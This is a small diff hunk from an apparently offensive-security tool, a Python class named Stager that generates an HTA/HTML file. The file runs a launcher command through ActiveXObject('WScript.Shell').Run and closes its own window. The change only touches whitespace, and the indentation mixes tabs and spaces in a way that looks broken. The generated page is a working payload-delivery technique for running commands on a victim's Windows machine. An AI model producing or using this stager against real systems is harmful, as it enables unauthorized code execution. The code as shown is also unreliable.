@@ -82,7 +82,7 @@ class Stager:
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
-		else:
+	else:
 			code = "<html><head><script>var c= '"
 			code += launcher + "'\n"
 			code += "new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>"
